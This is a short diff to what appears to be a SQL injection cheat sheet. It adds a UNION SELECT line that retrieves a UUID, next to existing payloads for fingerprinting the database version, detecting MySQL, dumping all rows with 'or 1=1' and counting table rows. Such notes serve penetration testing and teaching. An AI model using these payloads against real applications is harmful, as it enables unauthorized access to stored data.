@@ -9,6 +9,8 @@ UNION SELECT banner FROM v$version WHERE rownum=1 (For Oracle)
 select * from students where Student_ID = 5
 select * from students where Student_ID = 6-POW(1,1)  --> By use of a mysql POW function, if both the above queries result in same result then it's a MySQL DB 
 
+select * from students where Student_ID = 1 UNION select 1,1,1,1,UUID();  --> Will show the Universal Unique Identifier(UUID) namespace
+
 select * from students where Student_ID = 1 or 1=1;  --> Will give all columns data from the selected table
 
 select * from students where Student_ID = 1 UNION select count(*) from <Table_Name>;  --> Will return the number of rows/records in the table
